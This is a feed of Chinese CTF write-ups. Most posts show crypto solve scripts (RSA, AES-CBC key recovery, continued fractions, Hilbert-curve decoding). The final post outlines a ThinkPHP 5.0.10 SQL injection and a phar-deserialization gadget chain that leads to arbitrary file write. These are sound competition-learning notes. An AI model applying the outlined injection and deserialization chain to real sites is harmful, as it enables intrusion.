<p>出来这个，提交不对</p>
<blockquote>
<p>SharkCTF{n0_r3veRse_bU9_r1P34T_yEs}</p>
</blockquote>
<p>有两个字母明显拼错，应该是脚本的问题，base那里，手动改一下就好</p>
<h2 id="baby-RSA"><a href="#baby-RSA" class="headerlink" title="baby_RSA"></a>baby_RSA</h2><p>sage解一下方程</p>
<h2 id="medium-RSA（unsolved）"><a href="#medium-RSA（unsolved）" class="headerlink" title="medium_RSA（unsolved）"></a>medium_RSA（unsolved）</h2><p>就是要伪造不同的num1和num2，使得签名的结果相等</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">signature(num1, pubkey) == signature(num2, pubkey)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>生成秘钥的过程</p>
</blockquote>
<p>$n=pq$<br>$g=p+q$<br>$f=\varphi/(p-1,\ q-1)$<br>$e=g^f\ mod\ n^2$<br>$v\equiv_n\lfloor(e-1)/n\rfloor^{-1}$</p>
<p>我们可以得到n，f，v</p>
<blockquote>
<p>签名的过程</p>
</blockquote>
<p>$res=\lfloor(m^f\ mod\ n^2-1)/n\rfloor\times \lfloor(g^f\ mod\ n^2-1)/n\rfloor^{-1}\ mod\ n$</p>
<p>然后把res给sha256下得到签名结果</p>
<h2 id="aes-study"><a href="#aes-study" class="headerlink" title="aes_study"></a>aes_study</h2><blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, key, plaintext</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">msg1, msg2</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(msg1) == <span class="built_in">len</span>(msg2)</span><br><span class="line">    res = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(msg1)):</span><br><span class="line">        res += <span class="built_in">chr</span>(msg1[i] ^ msg2[i]).encode()</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">iv = flag</span><br><span class="line">salt = <span class="string">b&#x27;I_am_just_a_salt&#x27;</span></span><br><span class="line">plaintext = salt + plaintext</span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">cipher = aes.encrypt(plaintext)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(cipher)</span><br><span class="line"><span class="built_in">print</span>(xor(salt, key))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;output</span></span><br><span class="line"><span class="string">b&quot;\x8e\xd2;\xe1K\xb6\xbb\xfbg\xaf\n\xad\xb8\x91\x1b\xc6\xb8\x15\xad\x17R\xf7\x8d\xfd\xc5\xeaq;\x8fC\x89.O\x99\xd9M\xfavva:&lt;\xd5uuL\xb4&#x27;\x96\xfb\x88 SQ\xb6K\xad\xc0\xab\xdb1D\xfdV&quot;</span></span><br><span class="line"><span class="string">b&#x27;;:\x00\x01\x00\x0b\x10\x00+&lt;\x03&lt;,\n\t\r&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hint</span></span><br><span class="line"><span class="comment"># if you decrypt the key, try to run this code, you will found something interesting ^_^</span></span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, cipher[:<span class="number">16</span>])</span><br><span class="line"><span class="built_in">print</span>(aes.decrypt(cipher[<span class="number">16</span>:]))</span><br></pre></td></tr></table></figure>

<p>冷静分析一下，salt长16是第一块密文，异或得到key后直接用iv为<code>b&#39;\x00&#39;*16</code>生成aes对象，然后解密salt得到的再与salt异或就是原本的iv，就是flag，hint没深究什么用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">msg1, msg2</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(msg1) == <span class="built_in">len</span>(msg2)</span><br><span class="line">    res = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(msg1)):</span><br><span class="line">        res += <span class="built_in">chr</span>(msg1[i] ^ msg2[i]).encode()</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">salt = <span class="string">b&#x27;I_am_just_a_salt&#x27;</span></span><br><span class="line">cipher = <span class="string">b&quot;\x8e\xd2;\xe1K\xb6\xbb\xfbg\xaf\n\xad\xb8\x91\x1b\xc6\xb8\x15\xad\x17R\xf7\x8d\xfd\xc5\xeaq;\x8fC\x89.O\x99\xd9M\xfavva:&lt;\xd5uuL\xb4&#x27;\x96\xfb\x88 SQ\xb6K\xad\xc0\xab\xdb1D\xfdV&quot;</span></span><br><span class="line">salt_xor_key = <span class="string">b&#x27;;:\x00\x01\x00\x0b\x10\x00+&lt;\x03&lt;,\n\t\r&#x27;</span></span><br><span class="line">key = xor(salt, salt_xor_key)</span><br><span class="line"><span class="comment"># aes = AES.new(key, AES.MODE_CBC, cipher[:16])</span></span><br><span class="line"><span class="comment"># print(aes.decrypt(cipher[16:]))</span></span><br><span class="line"><span class="comment"># plaintext = b&#x27;This_is_the_real_plaintext_so_where_is_the_flag?&#x27;</span></span><br><span class="line">c1 = cipher[:<span class="number">16</span>]</span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(xor(salt, aes.decrypt(c1)))</span><br></pre></td></tr></table></figure>

<h2 id="easy-RSA（unsolved）"><a href="#easy-RSA（unsolved）" class="headerlink" title="easy_RSA（unsolved）"></a>easy_RSA（unsolved）</h2><p>感觉做过，但又完全没做过</p>
<p>把私钥给加密了，然后n比较特殊是$pq^2$，只有rsa才能打败rsa<br>$$<br>\begin{align}<br>c_1=m^e\ mod\ n\\<br>c_2=d^e\ mod\ n<br>\end{align}<br>$$<br>知道c1，c2还有n</p>
<p>c1乘以c2，然后我们可以用念力把d移动到幂上</p>
<img data-src="https://img2.baidu.com/it/u=100488731,1895111324&fm=26&fmt=auto" alt="img"/>

<p>显然有两个利用点，但是如果rsa是安全的话，就算把私钥给加密了， 没有私钥应该也是得不到私钥的吧（突然废话大师我悟了），所以这个条件完全没用？</p>
<p>目前通过搜索得到的情报</p>
<ol>
<li><p>Schmidt-Samoa密码系统</p>
</li>
<li><p>Asbullah的论文，提供了两个算法</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210921102131832.png" alt="image-20210921102131832"></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210921102156022.png" alt="image-20210921102156022"></p>
<p>但我用连分数试了下，无果</p>
</li>
</ol>
<p>使用连分数的脚本记下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">cipher = [</span><br><span class="line">    <span class="number">1031031275739772672620265227468630744639826650850152230421936101866006077669925004912178667757427466629632024881374707791325952868221595100081885526832942842026040171297601409073657039040314282247429347155536013961843760494915981277505854675273000718721690657015084473141430732029333117644105010172388534888766921758576003169352490182987629514445008235457264365580241254409907279072592375706606140546079301342323110426629344175416841044610355062187251566207864006042055477236371601630510717410344395606566715774594677726367106487886191108116474576786771214756156031934821696195447513854643214158721206274178814361145866711301866281545996570770353746322006293335907930615125173649123065425605727051499568354629059811564851162018116987937117227519375373443965614317576910983151451001351291986017592518699393654569740606725942439159945901390049958541192212200010424197867630048462976867006063773433717543676148203002834776634262</span>,</span><br><span class="line">    <span class="number">427758254382415837486627169903586043192159296039318441074461933745092029340448694096175109946245753195246814262819567533262451810052332405450716560571849213140885180173856551587913073299532107644491799556003896399818866305175352349346751314722576415776346304969996320863217041678143403067644016009615411010737559370133156446410055020685186435335470313884574914865891412617452265910734243504789980182558624400822862796541339623567917969899600164401464008985669419391933303540699639959809908793374182929155739823243017220533117710038049157763010512581281031119184742089044402194034365598637195703708047088123630678175359960520486949206285944574233192009388419398104082222605620849891876659072833092191551654472365200824659341839571984128702022835047590060023539856161799809238580562851150509794219414923021381190448036042219044339644762734802649041090859430137188161941607186005419294808381757372611413573897418193511161733357</span>,</span><br><span class="line">    <span class="number">1606461905396537704240877351915565237013657816060078479686401848795914997017893182969543555327012599375185853030055617193695470959514306231464860899742893376809547247853539954627902302123439286955582193619088244762445761773521086732485031690944878930103425589327252876068661045328399475577224811494486065370354677721814393231169608904174753637287339475887620772549324925052192942057466861593346711947268757541392653645286719614812322140788229360932690697513322209934602251055555606850825055298988726282856457008861729285091442372568622938272657386109749253502375776564687252035722918683051434126736803212417898523534388176800941465191787252257236597785048941709457736017470593837334808555244970357801193203420801923456329430924848838653047565867864787259647338964266821704026140906392573779299205631616922912035686141186592092555255087822424368970334093470756276801705385034554747866737105425505539804408353364229230032578981</span>]</span><br><span class="line">c1 = cipher[<span class="number">0</span>]</span><br><span class="line">c2 = cipher[<span class="number">1</span>]</span><br><span class="line">N = cipher[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rational_to_contfrac</span>(<span class="params">x, y</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Converts a rational x/y fraction into</span></span><br><span class="line"><span class="string">    a list of partial quotients [a0, ..., an]</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    a = x // y</span><br><span class="line">    pquotients = [a]</span><br><span class="line">    <span class="keyword">while</span> a * y != x:</span><br><span class="line">        x, y = y, x - a * y</span><br><span class="line">        a = x // y</span><br><span class="line">        pquotients.append(a)</span><br><span class="line">    <span class="keyword">return</span> pquotients</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">TODO:</span> efficient method that calculates convergents on-the-go, without doing partial quotients first</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convergents_from_contfrac</span>(<span class="params">frac</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    computes the list of convergents</span></span><br><span class="line"><span class="string">    using the list of partial quotients</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    convs = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(frac)):</span><br><span class="line">        convs.append(contfrac_to_rational(frac[<span class="number">0</span>:i]))</span><br><span class="line">    <span class="keyword">return</span> convs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">contfrac_to_rational</span>(<span class="params">frac</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Converts a finite continued fraction [a0, ..., an]</span></span><br><span class="line"><span class="string">    to an x/y rational.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(frac) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    num = frac[-<span class="number">1</span>]</span><br><span class="line">    denom = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">2</span>, -<span class="built_in">len</span>(frac) - <span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        num, denom = frac[_] * num + denom, num</span><br><span class="line">    <span class="keyword">return</span> num, denom</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Return the continued fractions expansions of x / y</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">continuedFraction</span>(<span class="params">x, y</span>):</span></span><br><span class="line">    ret = []</span><br><span class="line">    <span class="keyword">while</span> y:</span><br><span class="line">        ret.append(x // y)</span><br><span class="line">        x, y = y, x % y</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">expand</span>(<span class="params">ctnf</span>):</span></span><br><span class="line">    _ctnf = ctnf</span><br><span class="line">    _ctnf.reverse()</span><br><span class="line">    numerator = <span class="number">0</span></span><br><span class="line">    denominator = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> _ctnf:</span><br><span class="line">        numerator, denominator = denominator, x * denominator + numerator</span><br><span class="line">    <span class="keyword">return</span> numerator, denominator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Return the list of n progressive fraction</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">progressiveFraction</span>(<span class="params">x, y</span>):</span></span><br><span class="line">    cfe = continuedFraction(x, y)</span><br><span class="line">    cfeL = <span class="built_in">len</span>(cfe)</span><br><span class="line">    ret = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, cfeL):</span><br><span class="line">        ret.append(expand(cfe[<span class="number">0</span>: i]))</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Solve the equation: ax^2 +bx + c = 0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">a, b, c</span>):</span></span><br><span class="line">    par = math.sqrt(b * b - <span class="number">4</span> * a * c)</span><br><span class="line">    <span class="keyword">return</span> (-b + par) // (<span class="number">2</span> * a), (-b - par) // (<span class="number">2</span> * a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">asbullah1</span>(<span class="params">e, n</span>):</span></span><br><span class="line">    res = progressiveFraction(e, n - (<span class="number">2</span> * <span class="built_in">int</span>(<span class="built_in">pow</span>(n, <span class="number">2</span> / <span class="number">3</span>)) - <span class="built_in">int</span>(<span class="built_in">pow</span>(n, <span class="number">1</span> / <span class="number">3</span>))))</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line">    <span class="built_in">print</span>(rational_to_contfrac(e, n - (<span class="number">2</span> * <span class="built_in">int</span>(<span class="built_in">pow</span>(n, <span class="number">2</span> / <span class="number">3</span>)) - <span class="built_in">int</span>(<span class="built_in">pow</span>(n, <span class="number">1</span> / <span class="number">3</span>)))))</span><br><span class="line">    <span class="keyword">for</span> (d, k) <span class="keyword">in</span> res:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">pow</span>(d, e, n) == c2:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;find it&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> (e * d - <span class="number">1</span>) % k != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">        <span class="keyword">if</span> <span class="number">1</span> &lt; gcd(phi, n) &lt; n:</span><br><span class="line">            p, q = solve(<span class="number">1</span>, n - phi + <span class="number">1</span>, n)</span><br><span class="line">            <span class="keyword">if</span> p * q == n:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;find it&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;not found&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">asbullah2</span>(<span class="params">e, n</span>):</span></span><br><span class="line">    res = progressiveFraction(e, n)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line">    <span class="keyword">for</span> (X, Y) <span class="keyword">in</span> res:</span><br><span class="line">        <span class="keyword">if</span> Y == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> (n - e * X) % Y != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        S = (n - e * X) // Y</span><br><span class="line">        phi = S ** <span class="number">2</span> // (<span class="number">4</span> * n)</span><br><span class="line">        <span class="keyword">if</span> <span class="number">1</span> &lt; gcd(phi, n) &lt; n:</span><br><span class="line">            p, q = solve(<span class="number">1</span>, n - phi + <span class="number">1</span>, n)</span><br><span class="line">            <span class="keyword">if</span> p * q == n:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;find it&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;not found&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPQ</span>(<span class="params">pub, priv</span>):</span></span><br><span class="line">    <span class="keyword">return</span> gmpy2.gcd(pub, gmpy2.powmod(<span class="number">2</span>, pub*priv, pub)-<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">pub, priv, enc</span>):</span></span><br><span class="line">    <span class="keyword">return</span> gmpy2.powmod(enc, priv, getPQ(pub, priv))</span><br><span class="line"></span><br><span class="line">pubkey =  N</span><br><span class="line">privkey = c2</span><br><span class="line">enc = c1</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(decrypt(pubkey, privkey, enc)))</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20210919 长城杯Crypto方向WP</title>
    <url>/posts/d98f7fed/</url>
    <content><![CDATA[<p>kw就这？没做过瘾啊，一道密码就离谱，这就去学pwn</p>
<span id="more"></span>

<h1 id="长安杯"><a href="#长安杯" class="headerlink" title="长安杯"></a>长安杯</h1><h2 id="baby-rsa"><a href="#baby-rsa" class="headerlink" title="baby_rsa"></a>baby_rsa</h2><p>第四个解出来，可惜差一点抢血。虽然过程很懵，但是做出来后觉得是好题，emmmmm还好吧，有点小隐晦，凭感觉打</p>
<p>第一层难搞</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, v1, v2, m1, m2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc_1</span>(<span class="params">val</span>):</span></span><br><span class="line">    p, q = <span class="built_in">pow</span>(v1, (m1+<span class="number">1</span>))-<span class="built_in">pow</span>((v1+<span class="number">1</span>), m1), <span class="built_in">pow</span>(v2, (m2+<span class="number">1</span>))-<span class="built_in">pow</span>((v2+<span class="number">1</span>), m2)</span><br><span class="line">    <span class="keyword">assert</span> isPrime(p) <span class="keyword">and</span> isPrime(q) <span class="keyword">and</span> (</span><br><span class="line">        p*q).bit_length() == <span class="number">2048</span> <span class="keyword">and</span> q &lt; p &lt; q &lt;&lt; <span class="number">3</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(val, <span class="number">0x10001</span>, p*q)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>] == <span class="string">b&#x27;flag&#123;&#x27;</span></span><br><span class="line">plain1 = bytes_to_long(flag[:<span class="number">21</span>])</span><br></pre></td></tr></table></figure>

<p>$$<br>\begin{align}<br>p=v_1^{m_1+1}-(v_1+1)^{m_1}\\<br>q=v_2^{m_2+1}-(v_2+1)^{m_2}<br>\end{align}<br>$$</p>
<p>他们没有告诉我们模数，搞怪吧；不过如果告诉模数了应该算简单题了，或许可以直接分解模数</p>
<p>又去网上搜了一波<code>RSA模数未知</code>，但确实应该没有，选择明文攻击条件不符</p>
<p>既然现有的RSA攻击模式走不通，就凭借感觉吧，我觉得这个<code>v1, v2, m1, m2</code>可爆，然后根据第二层，m很小不需要这么多模数（虽然不知道为什么第二层的x为什么还能分解，但是问题不大），只需要知道p就好了，然后记得v1确定之后框定一下m1的范围就很快可以爆破出来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> log</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">c1 = <span class="number">15808773921165746378224649554032774095198531782455904169552223303513940968292896814159288417499220739875833754573943607047855256739976161598599903932981169979509871591999964856806929597805904134099901826858367778386342376768508031554802249075072366710038889306268806744179086648684738023073458982906066972340414398928411147970593935244077925448732772473619783079328351522269170879807064111318871074291073581343039389561175391039766936376267875184581643335916049461784753341115227515163545709454746272514827000601853735356551495685229995637483506735448900656885365353434308639412035003119516693303377081576975540948311</span></span><br><span class="line">c2 = (<span class="number">40625981017250262945230548450738951725566520252163410124565622126754739693681271649127104109038164852787767296403697462475459670540845822150397639923013223102912674748402427501588018866490878394678482061561521253365550029075565507988232729032055298992792712574569704846075514624824654127691743944112075703814043622599530496100713378696761879982542679917631570451072107893348792817321652593471794974227183476732980623835483991067080345184978482191342430627490398516912714451984152960348899589532751919272583098764118161056078536781341750142553197082925070730178092561314400518151019955104989790911460357848366016263083</span>, <span class="number">43001726046955078981344016981790445980199072066019323382068244142888931539602812318023095256474939697257802646150348546779647545152288158607555239302887689137645748628421247685225463346118081238718049701320726295435376733215681415774255258419418661466010403928591242961434178730846537471236142683517399109466429776377360118355173431016107543977241358064093102741819626163467139833352454094472229349598479358367203452452606833796483111892076343745958394932132199442718048720633556310467019222434693785423996656306612262714609076119634814783438111843773649519101169326072793596027594057988365133037041133566146897868269</span>, <span class="number">39796272592331896400626784951713239526857273168732133046667572399622660330587881579319314094557011554851873068389016629085963086136116425352535902598378739</span>)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># enc_2</span></span><br><span class="line">c2, n2, x = c2[<span class="number">0</span>], c2[<span class="number">1</span>], c2[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">assert</span> n2 % x == <span class="number">0</span></span><br><span class="line">n2 = x</span><br><span class="line">p1 = <span class="number">191</span></span><br><span class="line">p2 = <span class="number">193</span></span><br><span class="line">p3 = <span class="number">627383</span></span><br><span class="line">p4 = <span class="number">1720754738477317127758682285465031939891059835873975157555031327070111123628789833299433549669619325160679719355338187877758311485785197492710491</span></span><br><span class="line">phi2 = (p1 - <span class="number">1</span>) * (p2 - <span class="number">1</span>) * (p3 - <span class="number">1</span>) * (p4 - <span class="number">1</span>)</span><br><span class="line">d2 = invert(e, phi2)</span><br><span class="line">m2 = <span class="built_in">pow</span>(c2, d2, n2)</span><br><span class="line">flag2 = long_to_bytes(m2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># enc_1</span></span><br><span class="line">lbound, ubound = <span class="number">2</span> ** <span class="number">1021</span>, <span class="number">2</span> ** <span class="number">1027</span></span><br><span class="line"><span class="keyword">for</span> v1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">1000000</span>):</span><br><span class="line">    <span class="keyword">for</span> m1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(log(lbound, v1)), <span class="built_in">int</span>(log(ubound, v1))):</span><br><span class="line">        p = <span class="built_in">pow</span>(v1, (m1 + <span class="number">1</span>)) - <span class="built_in">pow</span>((v1 + <span class="number">1</span>), m1)</span><br><span class="line">        <span class="keyword">if</span> isPrime(p) <span class="keyword">and</span> <span class="number">1021</span> &lt; p.bit_length() &lt; <span class="number">1027</span>:</span><br><span class="line">            phi1 = p - <span class="number">1</span></span><br><span class="line">            d1 = invert(e, phi1)</span><br><span class="line">            m = <span class="built_in">pow</span>(c1, d1, p)</span><br><span class="line">            <span class="keyword">if</span> long_to_bytes(m).startswith(<span class="string">b&#x27;flag&#x27;</span>):</span><br><span class="line">                flag1 = long_to_bytes(m)</span><br><span class="line">                flag = flag1 + flag2</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h2 id="你这flag保熟吗"><a href="#你这flag保熟吗" class="headerlink" title="你这flag保熟吗"></a>你这flag保熟吗</h2><p>帮队友看题，看图形我记得在b站上看过一个up用计算机模拟二向箔二维化地球，用的就是希尔伯特曲线，有一部分原题改下脚本<a href="https://zhuanlan.zhihu.com/p/381863924">https://zhuanlan.zhihu.com/p/381863924</a></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210919140215766.png" alt="image-20210919140215766"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> xlrd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> hilbertcurve.hilbertcurve <span class="keyword">import</span> HilbertCurve</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line">filename = <span class="string">r&quot;password.xls&quot;</span></span><br><span class="line"><span class="comment"># xlrd操作xls文件</span></span><br><span class="line">excel = xlrd.open_workbook(filename)  <span class="comment"># 文件名以及路径，如果路径或者文件名有中文给前面加一个 r</span></span><br><span class="line"></span><br><span class="line">excel.sheet_names()  <span class="comment"># 获取excel里的工作表sheet名称数组</span></span><br><span class="line">sheet = excel.sheet_by_index(<span class="number">0</span>)  <span class="comment"># 根据下标获取对应的sheet表</span></span><br><span class="line"></span><br><span class="line">lis = []</span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    lis.append(sheet.row_values(index))</span><br><span class="line"></span><br><span class="line">arr = np.array(lis)</span><br><span class="line"></span><br><span class="line">hilbert_curve = HilbertCurve(<span class="number">8</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(np.size(arr)):</span><br><span class="line">    [x, y] = hilbert_curve.point_from_distance(i)</span><br><span class="line">    s += arr[y, x]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    s = b64decode(s)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>1f_y0u_h4ve_7he_fllllllag,_I_muSt_vvant_1t!</p>
</blockquote>
<p>后面得到flag.php就没了</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20210923 天翼杯TeamGipsyWP</title>
    <url>/posts/90da693a/</url>
    <content><![CDATA[<p>差几名进决赛，唔，木大木大</p>
<p>密码第一题挺好的，让我一下午学会TEA，队友Web出了道web（5解），Misc还出了一道取证；感谢他们还特地赏赐我在博客上发</p>
<span id="more"></span>

<h1 id="天翼杯"><a href="#天翼杯" class="headerlink" title="天翼杯"></a>天翼杯</h1><h2 id="Web-eztp"><a href="#Web-eztp" class="headerlink" title="Web-eztp"></a>Web-eztp</h2><p>登录处是一个 5.0.10 的sql注入</p>
<p><img data-src="https://j1ang.oss-cn-hangzhou.aliyuncs.com/img/1632382465862-ac9344cd-1da4-4b0d-aebc-a6cdbc19c0da.png" alt="image.png"></p>
<p>然后后面挖一条链子。</p>
<p>后台是文件上传，然后  is_dir 可以触发phar反序列化。</p>
<p>5.0.24 有个任意文件写入的漏洞，从 <code>__destruct</code> -&gt; <code>__tostring</code> -&gt; <code>__call</code> -&gt; <code>file_put_contents</code></p>
<p>题目环境是 5.0.10，原本链子的tostring 那里没办法到call，但是题目还提供了一些扩展可供使用，找个 可以触发 call 的 tostring就好。</p>
<p>由于 在析构函数的时候工作目录不稳定。</p>
<p><img data-src="https://j1ang.oss-cn-hangzhou.aliyuncs.com/img/1632382387356-b63e66a3-4439-4013-bf57-7de8c264636f.png" alt="image.png"></p>
<p>所以需要知道绝对路径。</p>
